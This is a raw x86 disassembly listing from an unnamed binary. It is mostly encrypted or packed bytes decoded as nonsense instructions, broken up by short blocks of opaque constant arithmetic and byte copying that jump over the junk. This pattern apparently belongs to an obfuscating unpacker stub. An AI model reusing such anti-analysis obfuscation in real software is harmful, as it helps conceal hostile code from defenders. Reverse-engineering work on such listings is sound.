  40ae89:	adc    BYTE PTR [edi+0x4e],dh
  40ae8c:	sub    al,0x3
  40ae8e:	mov    edi,0xe5339cdc
  40ae93:	rcr    BYTE PTR [ebx],1
  40ae95:	loop   0x40ae30
  40ae97:	push   0xd1ec2cf0
  40ae9c:	xchg   edi,eax
  40ae9d:	je     0x40aef7
  40ae9f:	mov    al,cl
  40aea1:	scas   eax,DWORD PTR es:[edi]
  40aea2:	mov    esi,0x1117e385
  40aea7:	jnp    0x40ae4a
  40aea9:	mov    eax,0xc7eab520
  40aeae:	test   DWORD PTR [esi+0x3e10fc98],ebp
  40aeb4:	xchg   edi,eax
  40aeb5:	push   0xa
  40aeb7:	sub    BYTE PTR ds:0xa7e3d1f,bh
  40aebd:	fs pop es
  40aebf:	or     ah,ah
  40aec1:	xor    eax,0xcd0f897a
  40aec6:	(bad)  
  40aec7:	pushf  
  40aec8:	iret   
  40aec9:	enter  0xbcd5,0x91
  40aecd:	dec    eax
  40aece:	dec    esi
  40aecf:	retf   0xa019
  40aed2:	sbb    BYTE PTR [edx-0x3dab0f01],dh
  40aed8:	ins    BYTE PTR es:[edi],dx
  40aed9:	aam    0x5c
  40aedb:	aad    0x7
  40aedd:	ret    0x747b
  40aee0:	jo     0x40ae76
  40aee2:	xchg   edx,eax
  40aee3:	aas    
  40aee4:	pop    esp
  40aee5:	inc    esp
  40aee6:	mov    dh,0x5a
  40aee8:	clc    
  40aee9:	pop    fs
  40aeeb:	stos   BYTE PTR es:[edi],al
  40aeec:	push   esi
  40aeed:	sahf   
  40aeee:	inc    ebp
  40aeef:	lock adc DWORD PTR [eax+0x3e],ecx
  40aef3:	push   ds
  40aef4:	add    eax,0x2e3cc442
  40aef9:	or     al,0x89
  40aefb:	stos   BYTE PTR es:[edi],al
  40aefc:	add    DWORD PTR [ebx+0x6],eax
  40aeff:	jg     0x40af36
  40af01:	push   es
  40af02:	retf   0x83a0
  40af05:	mov    esp,0xa990e706
  40af0a:	pop    esi
  40af0b:	pop    ebx
  40af0c:	add    eax,0xa0cb7bc5
  40af11:	pop    esi
  40af12:	and    BYTE PTR [edx],al
  40af14:	xchg   edx,eax
  40af15:	(bad)  
  40af16:	retf   
  40af17:	pushf  
  40af18:	pop    edx
  40af19:	(bad)  [ebx-0x2a34bc2e]
  40af1f:	xor    edi,eax
  40af21:	popa   
  40af22:	xor    al,0xbb
  40af24:	into   
  40af25:	inc    eax
  40af26:	sbb    ah,BYTE PTR [eax]
  40af28:	rcr    DWORD PTR [ebx+0x251bf0d5],1
  40af2e:	inc    ebp
  40af2f:	out    0x72,al
  40af31:	dec    ebp
  40af32:	dec    ecx
  40af33:	into   
  40af34:	mov    BYTE PTR [esi+0x61359922],cl
  40af3a:	mov    bl,0xce
  40af3c:	repz xlat BYTE PTR ds:[ebx]
  40af3e:	sbb    BYTE PTR [esi+ecx*8+0x1f604b8e],ah
  40af45:	je     0x40af3f
  40af47:	fidivr DWORD PTR [ebx+edx*1]
  40af4a:	mov    dl,0xa8
  40af4c:	xor    eax,DWORD PTR [ecx]
  40af4e:	sbb    al,0xeb
  40af50:	js     0x40af32
  40af52:	mov    al,0x75
  40af54:	nop    DWORD PTR [edi+0x3d]
  40af58:	jg     0x40af46
  40af5a:	dec    esp
  40af5b:	add    bl,dh
  40af5d:	mulps  xmm0,XMMWORD PTR [edi]
  40af60:	push   ebx
  40af61:	in     al,dx
  40af62:	push   eax
  40af63:	inc    ebp
  40af64:	and    eax,0x369bae68
  40af69:	xchg   esp,eax
  40af6a:	test   eax,0xf9a58748
  40af6f:	out    0x5e,eax
  40af71:	outs   dx,DWORD PTR ds:[esi]
  40af72:	sub    al,0x2a
  40af74:	iret   
  40af75:	lock cmp eax,0xc7acd069
  40af7b:	bound  ebp,QWORD PTR [ebx+0x5f]
  40af7e:	js     0x40af26
  40af80:	jmp    0xd21e:0x27f2d814
  40af87:	js     0x40afaa
  40af89:	cs aas 
  40af8b:	add    BYTE PTR [edx+0x2a],dh
  40af8e:	sub    DWORD PTR [edx+0x2c],edx
  40af91:	pop    ss
  40af92:	ds jp  0x40af59
  40af95:	jmp    0xdd0:0x3c0c963e
  40af9c:	mov    ebp,DWORD PTR [ebx+0x1899ee67]
  40afa2:	mov    ebx,0xa61133cd
  40afa7:	scas   eax,DWORD PTR es:[edi]
  40afa8:	mov    esp,0x303bb06f
  40afad:	jmp    0x7dd5046a
  40afb2:	shl    DWORD PTR [ebx-0x53dbbc7e],0x51
  40afb9:	add    edi,esp
  40afbb:	sub    cl,BYTE PTR [edi-0x4c]
  40afbe:	push   cs
  40afbf:	jnp    0x40afc7
  40afc1:	mov    WORD PTR [edx-0x644675f0],ds
  40afc7:	push   0x698715c2
  40afcc:	pop    ebx
  40afcd:	in     eax,dx
  40afce:	stc    
  40afcf:	or     ebx,DWORD PTR [ecx]
  40afd1:	jbe    0x40b043
  40afd3:	push   edi
  40afd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afd5:	inc    esp
  40afd6:	push   ebp
  40afd7:	and    al,0xfb
  40afd9:	fisttp WORD PTR ds:0xba876fc
  40afdf:	int    0x70
  40afe1:	popa   
  40afe2:	push   esp
  40afe3:	test   DWORD PTR [eax-0x75],ebp
  40afe6:	pop    ebp
  40afe7:	loopne 0x40aff8
  40afe9:	scas   eax,DWORD PTR es:[edi]
  40afea:	ror    DWORD PTR [ebx-0x2ccc1ba3],cl
  40aff0:	sub    edx,0x26bd
  40aff6:	add    eax,ecx
  40aff8:	and    edx,0x7126
  40affe:	mov    ebx,ecx
  40b000:	sub    ebx,edx
  40b002:	mov    edx,DWORD PTR [ebp-0x18]
  40b005:	sub    eax,edx
  40b007:	mov    edx,DWORD PTR [ebp-0x14]
  40b00a:	sub    eax,edx
  40b00c:	mov    edx,DWORD PTR [ebp+0xc]
  40b00f:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40b016:	mov    BYTE PTR [eax-0xbb5],dl
  40b01c:	mov    eax,DWORD PTR [ebp-0x10]
  40b01f:	xor    eax,0xffffe1ce
  40b024:	add    eax,DWORD PTR [ebp-0xc]
  40b027:	xor    edx,edx
  40b029:	and    eax,0x6d33
  40b02e:	lea    ecx,[ecx+eax*1-0x6520]
  40b035:	mov    eax,DWORD PTR [ebp+0x8]
  40b038:	mov    ebx,DWORD PTR [ebp-0x4]
  40b03b:	add    eax,edi
  40b03d:	div    ebx
  40b03f:	mov    edx,DWORD PTR [ebp-0x8]
  40b042:	mov    ebx,0x940a7
  40b047:	sub    eax,edx
  40b049:	xor    edx,edx
  40b04b:	div    ebx
  40b04d:	add    eax,esi
  40b04f:	cmp    ecx,eax
  40b051:	jb     0x40aa71
  40b057:	xor    ebx,ebx
  40b059:	inc    ebx
  40b05a:	mov    DWORD PTR [ebp+0xc],0x77bd
  40b061:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40b068:	mov    DWORD PTR [ebp-0x8],0x4738
  40b06f:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40b076:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40b07d:	mov    DWORD PTR [ebp-0x14],0x64ec
  40b084:	mov    DWORD PTR [ebp-0x18],0x1984
  40b08b:	mov    DWORD PTR [ebp-0x1c],0x293
  40b092:	mov    eax,DWORD PTR [ebp+0x8]
  40b095:	mov    ecx,DWORD PTR [ebp+0xc]
  40b098:	add    eax,0x1ef2
  40b09d:	and    eax,ecx
  40b09f:	xor    eax,0x7240
  40b0a4:	mov    ecx,0x7aaa
  40b0a9:	sub    ecx,eax
  40b0ab:	mov    DWORD PTR [ebp+0xc],0x8d3
  40b0b2:	mov    DWORD PTR [ebp+0x8],0x2392
  40b0b9:	mov    DWORD PTR [ebp-0x20],ebx
  40b0bc:	mov    DWORD PTR [ebp-0x24],0x338f
  40b0c3:	mov    DWORD PTR [ebp-0x28],0x61c9
  40b0ca:	mov    eax,DWORD PTR [ebp+0x8]
  40b0cd:	mov    edx,DWORD PTR [ebp+0xc]
  40b0d0:	imul   eax,edx
  40b0d3:	xor    eax,0x40a0
  40b0d8:	or     eax,0x1a48
  40b0dd:	xor    eax,0x139ddb0
  40b0e2:	mov    esi,ecx
  40b0e4:	jmp    0x40b37b
  40b0e9:	stos   BYTE PTR es:[edi],al
  40b0ea:	(bad)  
  40b0eb:	mov    ss,WORD PTR [esi-0x355674c]
  40b0f1:	sub    BYTE PTR [edx],dh
  40b0f3:	inc    eax
  40b0f4:	(bad)  
  40b0f6:	adc    edi,DWORD PTR [edx+edx*4]
  40b0f9:	ret    0xbeaf
  40b0fc:	mov    esi,0xbebec2a9
  40b101:	inc    eax
  40b102:	pop    ds
  40b103:	mov    dl,0xdc
  40b105:	adc    DWORD PTR [ebx+0xd66488e],ebx
  40b10b:	in     al,dx
  40b10c:	inc    ebp
  40b10d:	add    ecx,DWORD PTR [edi]
  40b10f:	hlt    
  40b110:	push   eax
  40b111:	int3   
  40b112:	lock test DWORD PTR [esi+0x5f],edx
  40b116:	or     esp,esi
  40b118:	add    eax,0x9de8422e
  40b11d:	sbb    DWORD PTR [ecx+0x64],edx
  40b120:	pop    edi
  40b121:	push   esp
  40b122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b123:	adc    edx,ebx
  40b125:	mov    al,BYTE PTR [edx]
  40b127:	outs   dx,DWORD PTR ds:[esi]
  40b128:	stos   BYTE PTR es:[edi],al
  40b129:	inc    ebp
  40b12a:	iret   
  40b12b:	cs rcr edx,0x9e
  40b12f:	push   ss
  40b130:	or     al,0x48
  40b132:	sbb    eax,0x80aded34
  40b137:	cmp    al,0xcb
  40b139:	sbb    ecx,edx
  40b13b:	jbe    0x40b19e
  40b13d:	stc    
  40b13e:	cwde   
  40b13f:	cs icebp 
  40b141:	push   edx
  40b142:	sub    bh,BYTE PTR [ecx]
  40b144:	(bad)  
  40b146:	dec    esi
  40b147:	add    BYTE PTR [ecx],bl
  40b149:	sbb    al,0x9c
  40b14b:	or     DWORD PTR [edi-0xd3d1655],0x5f07a8f9
  40b155:	mov    ebx,0x4916e82
  40b15a:	pop    ebx
  40b15b:	(bad)  
  40b15c:	call   0x3f5f:0x9859b5d2
  40b163:	aas    
  40b164:	xlat   BYTE PTR gs:[ebx]
  40b166:	bound  eax,QWORD PTR [eax]
  40b168:	cli    
  40b169:	ds sbb ch,al
  40b16c:	and    edx,0xffffffb9
  40b16f:	imul   edx,DWORD PTR [edx+0x78],0xffffffb5
  40b173:	lods   eax,DWORD PTR ds:[esi]
  40b174:	jo     0x40b1c8
  40b176:	sub    BYTE PTR [edi-0x22edc3b2],0xf5
  40b17d:	popa   
  40b17e:	or     al,0x3b
  40b180:	xor    al,0xbf
  40b182:	adc    BYTE PTR [ebx+ebx*4-0x129f3d8],dh
  40b189:	push   eax
  40b18a:	push   0xf3bafcd0
  40b18f:	out    dx,eax
  40b190:	jl     0x40b169
  40b192:	and    al,0xed
  40b194:	fnstenv [edi]
  40b196:	(bad)
  40b199:	dec    ebx
  40b19a:	or     edi,DWORD PTR fs:[edi-0xf161a09]
  40b1a1:	push   edi
  40b1a2:	ret    
  40b1a3:	jg     0x40b20c
  40b1a5:	cmp    al,0x46
  40b1a7:	call   0x8efc64c1
  40b1ac:	retf   
  40b1ad:	or     DWORD PTR [ecx+0x5643c776],edx
  40b1b3:	dec    ebx
  40b1b4:	sbb    bl,al
  40b1b6:	shl    BYTE PTR [esi+edx*8+0x421f2c33],cl
  40b1bd:	sbb    cl,bh
  40b1bf:	xchg   DWORD PTR [edx],edx
  40b1c1:	fcmovb st,st(0)
  40b1c3:	(bad)  
  40b1c4:	push   DWORD PTR [edi-0x1c8705e7]
  40b1ca:	cmp    al,BYTE PTR [eax-0x6a0f897e]
  40b1d0:	repz dec esi
  40b1d2:	fisttp DWORD PTR [edx-0x1d]
  40b1d5:	enter  0x6e7,0x7f
  40b1d9:	mov    ah,0x22
  40b1db:	outs   dx,DWORD PTR ds:[esi]
  40b1dc:	lods   al,BYTE PTR ds:[esi]
  40b1dd:	adc    al,0x38
  40b1df:	sub    DWORD PTR [eax-0x50],edx
  40b1e2:	mov    ch,BYTE PTR [ebx+0xfd5ab20]
  40b1e8:	out    0x93,eax
  40b1ea:	inc    edi
  40b1eb:	into   
  40b1ec:	mov    esi,0xb5f14d90
  40b1f1:	(bad)  
  40b1f2:	gs call 0x171abca
  40b1f8:	pop    es
  40b1f9:	mov    eax,0x458793c
  40b1fe:	mov    edi,0x323530fe
  40b203:	mov    cl,0x11
  40b205:	sub    ch,0xc9
  40b208:	loope  0x40b1b2
  40b20a:	jb     0x40b19f
  40b20c:	push   edi
  40b20d:	out    0x88,al
  40b20f:	ficomp DWORD PTR [ebx-0x5f]
  40b212:	aaa    
  40b213:	imul   esp,DWORD PTR [edx],0x59
  40b216:	mov    bh,0xb8
  40b218:	adc    edx,ecx
  40b21a:	or     al,0xc5
  40b21c:	stos   BYTE PTR es:[edi],al
  40b21d:	repz adc DWORD PTR [ebx-0x4],0x7c32574a
  40b225:	icebp  
  40b226:	adc    dh,BYTE PTR [edi-0x38]
  40b229:	ss cli 
  40b22b:	push   esi
  40b22c:	sbb    BYTE PTR [esi+0xc],ah
  40b22f:	jnp    0x40b2a3
  40b231:	jnp    0x40b26e
  40b233:	dec    esp
  40b234:	dec    esp
  40b235:	push   edx
  40b236:	mov    edi,0xec8d7a16
  40b23b:	pop    edi
  40b23c:	cmp    DWORD PTR [ecx+ebp*2],ebx
  40b23f:	dec    esi
  40b240:	jnp    0x40b216
  40b242:	lods   eax,DWORD PTR ds:[esi]
  40b243:	mov    eax,0xe5858c4f
  40b248:	dec    ebx
  40b249:	mov    al,ds:0x6ac0847
  40b24e:	dec    edx
  40b24f:	and    BYTE PTR [esi+edx*2+0xb05e425],al
  40b256:	nop
  40b257:	cld    
  40b258:	pop    esi
  40b259:	(bad)  ds:0xc689d201
  40b25f:	dec    esi
  40b260:	or     DWORD PTR [edi-0x79bbc6f4],edi
  40b266:	test   BYTE PTR [ebx+0x6c],bh
  40b269:	neg    DWORD PTR [ebx+0x294c1f07]
  40b26f:	dec    ebx
  40b270:	and    cl,ch
  40b272:	rol    BYTE PTR [ecx],1
  40b274:	fwait
  40b275:	aas    
  40b276:	add    dh,BYTE PTR [eax-0xff7f51]
  40b27c:	push   ebx
  40b27d:	mov    eax,0x775992cb
  40b282:	in     al,0x8c
  40b284:	adc    al,0xb1
  40b286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b287:	ins    DWORD PTR es:[edi],dx
  40b288:	mov    ds:0xb9e9748f,al
  40b28d:	and    eax,0x13ff048f
  40b292:	cmp    al,0x8b
  40b294:	push   esi
  40b295:	adc    al,0xd1
  40b297:	jmp    0x40b309
  40b299:	dec    ebx
  40b29a:	je     0x40b237
  40b29c:	fcmovnb st,st(5)
  40b29e:	loop   0x40b2e1
  40b2a0:	int3   
  40b2a1:	shl    BYTE PTR [edx-0x6e],1
  40b2a4:	out    0xb8,al
  40b2a6:	popf   
  40b2a7:	mov    esp,0x41787937
  40b2ac:	mov    WORD PTR [ebx],fs
  40b2ae:	dec    ebp
  40b2af:	dec    esp
  40b2b0:	add    DWORD PTR [eax+0x35fe95c4],edx
  40b2b6:	or     eax,0x192f418b
  40b2bb:	xor    al,0x7d
  40b2bd:	mov    al,0x94
  40b2bf:	mov    esi,DWORD PTR [ebp-0x2a]
  40b2c2:	cmp    DWORD PTR [ebp-0x42f9f42d],0xf95a876f
  40b2cc:	repz mov fs,WORD PTR [edi-0x1e]
  40b2d0:	or     BYTE PTR [eax-0x3f],bl
  40b2d3:	sub    al,0xd8
  40b2d5:	adc    BYTE PTR [ebx],dl
  40b2d7:	cmp    BYTE PTR [edx+ebp*1],bl
  40b2da:	sbb    eax,0xf81b7c9a
  40b2df:	mov    cl,0x4
  40b2e1:	repnz mov eax,0x33432370
  40b2e7:	adc    eax,0xee8db4ec
  40b2ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2ed:	es in  al,dx
  40b2ef:	xlat   BYTE PTR ds:[ebx]
  40b2f0:	inc    ecx
  40b2f1:	fimul  WORD PTR [edi]
  40b2f3:	inc    esp
  40b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f5:	mov    ah,0x82
  40b2f7:	cmc    
  40b2f8:	lods   al,BYTE PTR ds:[esi]
  40b2f9:	imul   ebx,DWORD PTR [ecx],0x3ad3363
  40b2ff:	js     0x40b330
  40b301:	pop    edx
  40b302:	xchg   ebx,eax
  40b303:	fild   QWORD PTR [ebp+0x60]
  40b306:	mov    dh,0x15
  40b308:	jne    0x40b343
  40b30a:	sbb    eax,ebx
  40b30c:	pushf  
  40b30d:	retf   
  40b30e:	fist   DWORD PTR [esp+eax*2-0x439dbc20]
  40b315:	push   es
  40b316:	mov    edi,0x491afeef
  40b31b:	jg     0x40b2ab
  40b31d:	mov    WORD PTR [eax+0x6f],?
  40b320:	ror    bl,1
  40b322:	and    DWORD PTR [edx],ebx
  40b324:	cmp    al,0xfb
  40b326:	or     bh,BYTE PTR [edx+0x17d718e3]
  40b32c:	jmp    0x40b310
  40b32e:	xor    edx,0x7b
  40b331:	cdq    
  40b332:	je     0x40b348
  40b334:	gs ret 0xc7c8
  40b338:	mov    edi,0x289ce9dc
  40b33d:	or     edx,ebx
  40b33f:	jbe    0x40b38c
  40b341:	jmp    0x40b358
  40b343:	fld    st(2)
  40b345:	out    0x7,eax
  40b347:	xor    bl,BYTE PTR [eax-0x40]
  40b34a:	mov    ch,0x48
  40b34c:	aaa    
  40b34d:	mov    eax,ds:0xf49a3393
  40b352:	test   eax,ebx
  40b354:	fstp   TBYTE PTR [ebx-0x7e]
  40b357:	loopne 0x40b341
  40b359:	ret    
  40b35a:	dec    esi
  40b35b:	mov    al,dl
  40b35d:	mov    DWORD PTR [edi],ebx
  40b35f:	test   al,0x80
  40b361:	retf   
  40b362:	adc    DWORD PTR [edx-0x44a4cdb],ecx
  40b368:	mov    bl,0x2f
  40b36a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b36b:	adc    esp,DWORD PTR [edi-0x3efb49a4]
  40b371:	out    0xb,al
  40b373:	cmc    
  40b374:	ins    BYTE PTR es:[edi],dx
  40b375:	sbb    DWORD PTR [edx+0x12c76932],eax
  40b37b:	sub    esi,eax
  40b37d:	mov    eax,DWORD PTR [ebp-0x28]
  40b380:	mov    edx,DWORD PTR [ebp-0x24]
  40b383:	mov    edi,DWORD PTR [ebp-0x20]
  40b386:	or     eax,0x1cc2
  40b38b:	sub    eax,edx
  40b38d:	xor    edx,edx
  40b38f:	div    edi
  40b391:	mov    edx,DWORD PTR ds:0x422708
  40b397:	mov    edx,DWORD PTR [edx+0x1d4]
  40b39d:	sub    edx,eax
  40b39f:	mov    eax,DWORD PTR [ebp+0x10]
  40b3a2:	mov    al,BYTE PTR [esi+eax*1]
  40b3a5:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40b3ac:	mov    eax,DWORD PTR [ebp-0x1c]
  40b3af:	mov    edx,DWORD PTR [ebp-0x18]
  40b3b2:	imul   eax,edx
  40b3b5:	mov    edx,DWORD PTR [ebp-0x14]
  40b3b8:	imul   eax,eax,0x262b
  40b3be:	or     eax,edx
  40b3c0:	jmp    0x40b657
  40b3c5:	dec    ecx
  40b3c6:	mov    bl,0x7d
  40b3c8:	push   esp
  40b3c9:	mov    bh,0x74
  40b3cb:	pushf  
  40b3cc:	mov    esp,0xe3db5995
  40b3d1:	(bad)  [ebx]
  40b3d3:	int    0x90
  40b3d5:	lods   eax,DWORD PTR ds:[esi]
  40b3d6:	mov    bl,0xbe
  40b3d8:	mov    esi,0xbebec2a9
  40b3dd:	cwde   
  40b3de:	aas    
  40b3df:	or     esp,eax
  40b3e1:	dec    ebp
  40b3e2:	mov    al,ds:0xa6a763df
  40b3e7:	lahf   
  40b3e8:	sti    
  40b3e9:	mov    edi,0xc5b2e39
  40b3ee:	hlt    
  40b3ef:	xor    eax,0x2e1ed046
  40b3f4:	pop    ss
  40b3f5:	cmc    
  40b3f6:	ja     0x40b400
  40b3f8:	adc    DWORD PTR [ecx-0x3b7e3b56],eax
  40b3fe:	add    eax,0x9518348d
  40b403:	push   eax
  40b404:	test   eax,0x5aaf48a
  40b409:	jnp    0x40b3a0
  40b40b:	lds    eax,FWORD PTR [eax-0x3acb2c1d]
  40b411:	pusha  
  40b412:	test   DWORD PTR [edx-0x2d],ebx
  40b415:	aam    0x8
  40b417:	ret    0xa3d2
  40b41a:	dec    eax
  40b41b:	and    DWORD PTR [ecx],ebx
  40b41d:	or     eax,0x875567be
  40b422:	icebp  
  40b423:	add    DWORD PTR [ebp+ecx*2+0x15],ebx
  40b427:	int    0xbf
  40b429:	mov    eax,ds:0x3f4b8ebf
  40b42e:	jb     0x40b3cf
  40b430:	jno    0x40b3c2
  40b432:	call   0x48e3302f
  40b437:	hlt    
  40b438:	dec    DWORD PTR [esi+eiz*1+0x6a]
  40b43c:	mov    bh,0xdd
  40b43e:	xor    BYTE PTR [ebx],0xf3
  40b441:	mul    dl
  40b443:	rcr    ah,1
  40b445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b446:	xchg   dh,al
  40b448:	and    cl,BYTE PTR [edx]
  40b44a:	retf   
  40b44b:	mov    ah,0x76
  40b44d:	outs   dx,DWORD PTR ds:[esi]
  40b44e:	sub    al,BYTE PTR [edx+0x1febbb5e]
  40b454:	pusha  
  40b455:	cli    
  40b456:	sub    al,0x46
  40b458:	xor    al,0x57
  40b45a:	push   cs
  40b45b:	xchg   ecx,eax
  40b45c:	mov    bl,0x52
  40b45e:	std    
  40b45f:	mov    ch,0xe2
  40b461:	clc    
  40b462:	bound  ecx,QWORD PTR [ecx+0x13]
  40b465:	cmp    dl,BYTE PTR [ebx-0x3ff3f1f9]
  40b46b:	and    eax,0x6749dcf4
  40b470:	inc    ebp
  40b471:	sbb    dh,BYTE PTR [edx+eax*1]
  40b474:	cmc    
  40b475:	aaa    
  40b476:	sar    ecx,1
  40b478:	mov    dh,0xf5
  40b47a:	fbstp  TBYTE PTR [esi]
  40b47c:	sub    al,0x82
  40b47e:	mov    ebp,eax
  40b480:	into   
  40b481:	or     esp,ecx
  40b483:	inc    BYTE PTR [edi+ecx*2]
  40b486:	shr    BYTE PTR [edi-0x1c],cl
  40b489:	sbb    eax,0xa1d72f4
  40b48e:	push   0x72
  40b490:	in     al,dx
  40b491:	(bad)  
  40b492:	stc    
  40b493:	add    eax,0x20a23a0d
  40b498:	mov    eax,0xedc7b9b8
  40b49d:	daa    
  40b49e:	stos   DWORD PTR es:[edi],eax
  40b49f:	xlat   BYTE PTR ds:[ebx]
  40b4a0:	xor    BYTE PTR [edx-0x6d883b27],dl
  40b4a6:	push   edx
  40b4a7:	ja     0x40b4c5
  40b4a9:	jl     0x40b4d4
  40b4ab:	pop    ss
  40b4ac:	add    al,0x15
  40b4ae:	mov    esp,0xd136b091
  40b4b3:	retf   0xd99b
  40b4b6:	test   DWORD PTR [ebx+0x4068bd07],eax
  40b4bc:	dec    eax
  40b4bd:	popf   
  40b4be:	std    
  40b4bf:	mov    ecx,0xc9695c84
  40b4c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4c5:	ins    DWORD PTR es:[edi],dx
  40b4c6:	mov    WORD PTR [edi+0x78376a8e],cs
  40b4cc:	addr16 sub cl,dl
  40b4cf:	test   eax,0x911191ef
  40b4d4:	(bad)  
  40b4d6:	stc    
  40b4d7:	dec    ebx
  40b4d8:	sub    cl,BYTE PTR [ecx-0x44b61895]
  40b4de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4df:	jg     0x40b4ef
  40b4e1:	hlt    
  40b4e2:	mov    ecx,0x84e83092
  40b4e7:	push   eax
  40b4e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4e9:	cmp    eax,0xdc80db50
  40b4ee:	fwait
  40b4ef:	cwde   
  40b4f0:	aad    0xe9
  40b4f2:	shl    DWORD PTR [edi-0x61],0x91
  40b4f6:	jmp    0x9620:0x4eac0efa
  40b4fd:	dec    esi
  40b4fe:	mov    ch,0x5c
  40b500:	out    0x28,al
  40b502:	dec    ecx
  40b503:	int    0x3b
  40b505:	push   0x62c27263
  40b50a:	sub    eax,0x1a2faa82
  40b50f:	rcr    dl,0x4c
  40b512:	inc    eax
  40b513:	stc    
  40b514:	adc    ah,BYTE PTR [edi-0x27]
  40b517:	vpcmpgtd ymm3,ymm6,ymm5
  40b51b:	in     al,0xa3
  40b51d:	cwde   
  40b51e:	pop    esp
  40b51f:	out    0x5,al
  40b521:	mov    dl,0xc
  40b523:	scas   eax,DWORD PTR es:[edi]
  40b524:	int3   
  40b525:	sub    DWORD PTR [esi],esi
  40b527:	xchg   esi,eax
  40b528:	ins    DWORD PTR es:[edi],dx
  40b529:	cmp    BYTE PTR [edi-0x1b],al
  40b52c:	nop
  40b52d:	fs xchg ebx,eax
  40b52f:	stc    
  40b530:	mov    gs,WORD PTR [esi-0x457a9d34]
  40b536:	push   ds
  40b537:	dec    ebp
  40b538:	xchg   ecx,eax
  40b539:	and    DWORD PTR [esi-0x4d],ecx
  40b53c:	ins    BYTE PTR es:[edi],dx
  40b53d:	mov    BYTE PTR [ebx+esi*1],dl
  40b540:	xor    BYTE PTR [edi],ch
  40b542:	fwait
  40b543:	call   0x4b690aca
  40b548:	and    eax,0xbc22c3e2
  40b54d:	out    0xad,eax
  40b54f:	scas   al,BYTE PTR es:[edi]
  40b550:	enter  0x549e,0x83
  40b554:	das    
  40b555:	out    0x64,eax
  40b557:	(bad)
  40b55a:	mov    esp,0x5deb6f2e
  40b55f:	pushf  
  40b560:	dec    edi
  40b561:	mov    eax,esi
  40b563:	sub    DWORD PTR [eax],edx
  40b565:	adc    BYTE PTR [esi],ah
  40b567:	or     BYTE PTR [esp+esi*8-0x2],ah
  40b56b:	xchg   esp,eax
  40b56c:	cs stc 
  40b56e:	jbe    0x40b568
  40b570:	out    0xb4,eax
  40b572:	dec    edi
  40b573:	mov    dl,cl
  40b575:	mov    edi,0xb5528aa7
  40b57a:	adc    dl,cl
  40b57c:	push   ebp
  40b57d:	mov    al,0x56
  40b57f:	jb     0x40b586
  40b581:	add    eax,0x5a675640
  40b586:	outs   dx,DWORD PTR ds:[esi]
  40b587:	nop
  40b588:	mov    esi,0xfc931ff5
  40b58d:	into   
  40b58e:	xor    DWORD PTR [ebx-0x53c995f2],edi
  40b594:	and    eax,0xf63db66b
  40b599:	popf   
  40b59a:	mov    al,ds:0x97686d37
  40b59f:	and    dl,BYTE PTR [esi-0x26]
  40b5a2:	mov    ebx,0xc2025cb4
  40b5a7:	(bad)  
  40b5a8:	pop    ds
  40b5a9:	in     eax,0x69
  40b5ab:	xchg   ebp,eax
  40b5ac:	into   
  40b5ad:	mov    ch,0xe2
  40b5af:	mov    esi,esp
  40b5b1:	xlat   BYTE PTR ds:[ebx]
  40b5b2:	sti    
  40b5b3:	sub    ebp,0xe4cccfe0
  40b5b9:	mov    ch,0x80
  40b5bb:	adc    ebp,ebp
  40b5bd:	mov    esp,0x3e6c5f49
  40b5c2:	imul   esp,DWORD PTR [esi+0xb50f09e],0x6ab878ef
  40b5cc:	mov    edi,0x72c65fa8
  40b5d1:	sub    ebx,DWORD PTR [eax]
  40b5d3:	mov    dl,0xc2
  40b5d5:	sbb    eax,edi
  40b5d7:	pop    esp
  40b5d8:	(bad)  
  40b5d9:	fdiv   DWORD PTR ds:0x959b2e40
  40b5df:	adc    DWORD PTR [ecx+eiz*1-0x283d4554],ecx
  40b5e6:	dec    edi
  40b5e7:	icebp  
  40b5e8:	scas   al,BYTE PTR es:[edi]
  40b5e9:	cmp    ebx,ebp
  40b5eb:	mov    ch,0x3
  40b5ed:	dec    edi
  40b5ee:	int    0x83
  40b5f0:	mov    bh,0xe8
  40b5f2:	push   0xb130530f
  40b5f7:	pushf  
  40b5f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5f9:	xor    DWORD PTR [esi-0x35],0x54fc8238
  40b600:	mov    dl,0xea
  40b602:	enter  0xcfea,0x4f
  40b606:	ds test eax,0x1e864670
  40b60c:	push   cs
  40b60d:	pop    es
  40b60e:	repnz xchg ecx,eax
  40b610:	mov    ecx,0xfea57dfb
  40b615:	sbb    eax,0x1764f4a2
  40b61a:	mov    WORD PTR [eax-0x12],?
  40b61d:	lds    eax,FWORD PTR [edi+0x17]
  40b620:	cdq    
  40b621:	sbb    DWORD PTR [esi+0x2b],eax
  40b624:	sbb    edi,DWORD PTR [ebx]
  40b626:	pop    ebx
  40b627:	out    0xad,eax
  40b629:	inc    edx
  40b62a:	hlt    
  40b62b:	cmp    eax,0x6de1c45c
  40b630:	into   
  40b631:	out    dx,eax
  40b632:	add    bl,BYTE PTR [edi+0x6a]
  40b635:	stos   DWORD PTR es:[edi],eax
  40b636:	out    dx,al
  40b637:	shr    ah,cl
  40b639:	mov    ds:0x8f5768fe,eax
  40b63e:	test   eax,0xd1eae460
  40b643:	(bad)  
  40b644:	sbb    eax,0x416ba26a
  40b649:	mov    al,ds:0x7500532d
  40b64e:	push   0x621305de
  40b653:	fwait
  40b654:	ret    
  40b655:	inc    eax
  40b656:	aam    0x8b
  40b658:	push   ebp
  40b659:	lock or eax,edx
  40b65c:	xor    eax,0x59f6
  40b661:	lea    ecx,[ecx+eax*1+0x350559e6]
  40b668:	mov    eax,DWORD PTR [ebp-0xc]
  40b66b:	and    eax,0xddc
  40b670:	add    eax,DWORD PTR [ebp-0x8]
  40b673:	xor    eax,0x46e3
  40b678:	add    eax,0x50eb
